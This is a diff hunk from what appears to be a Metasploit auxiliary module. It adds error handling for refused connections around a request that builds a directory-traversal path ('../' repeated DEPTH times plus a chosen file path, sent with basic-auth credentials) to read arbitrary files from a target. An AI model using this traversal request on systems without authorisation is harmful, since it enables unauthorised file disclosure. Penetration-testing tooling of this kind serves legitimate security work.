@@ -54,11 +54,16 @@ class Metasploit3 < Msf::Auxiliary
 
 		# Create request
 		traversal = "../" * datastore['DEPTH'] #The longest of all platforms tested was 9 deep
-		res = send_request_raw({
-			'method' => 'GET',
-			'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
-			'basic_auth' => "#{datastore['USERNAME']}:#{datastore['PASSWORD']}"
-		}, 25)
+		begin
+			res = send_request_raw({
+				'method' => 'GET',
+				'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
+				'basic_auth' => "#{datastore['USERNAME']}:#{datastore['PASSWORD']}"
+			}, 25)
+		rescue Rex::ConnectionRefused
+			print_error("#{rhost}:#{rport} Could not connect.")
+			return
+		end
 
 		# Show data if needed
 		if res
